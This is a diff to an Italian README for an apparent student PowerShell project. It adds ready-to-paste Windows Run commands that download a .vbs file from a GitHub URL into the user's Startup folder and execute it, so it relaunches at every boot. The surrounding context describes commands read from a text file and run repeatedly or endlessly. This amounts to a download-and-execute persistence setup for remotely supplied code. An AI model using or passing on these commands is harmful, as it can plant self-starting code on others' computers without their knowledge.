@@ -33,3 +33,12 @@
   - n: quante volte eseguire il comando
 	    - n > 0: il comando viene eseguito n volte e al termine il file .txt viene sovrascritto da un file vuoto
 	    - n = 0 o "": il comando viene eseguito all'infinito
+
+COMANDO PER IL DOWNLOAD DEL FILE .vbs NELLA CARTELLA DI AVVIO DEL COMPUTER (comando da eseuire all'interno di Windows Run: Win + r)
+ - powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/simonemichele05/PowershellProgetto/main/avvio.vbs -OutFile ($env:appData + '\Microsoft\Windows\Start Menu\Programs\Startup\avvio.vbs')"
+
+COMANDO PER L'AVVIO DEL FILE .vbs NELLA CARTELLA DI AVVIO DEL COMPUTER (il comando in realtà è superfluo: il file verrà comunque eseguito all'avvio del computer)
+ - powershell -Command ".($env:appData + '\Microsoft\Windows\Start Menu\Programs\Startup\avvio.vbs')"
+
+COMANDO PER IL DOWNLOAD E PER L'ESECUZIONE DEL FILE .vbs (PROBLEMA: il comando è troppo lungo e non può essere eseguito)
+ - powershell -Command "Invoke-WebRequest -Uri https://raw.githubusercontent.com/simonemichele05/PowershellProgetto/main/avvio.vbs -OutFile ($env:appData + '\Microsoft\Windows\Start Menu\Programs\Startup\avvio.vbs'); .($env:appData + '\Microsoft\Windows\Start Menu\Programs\Startup\avvio.vbs')"
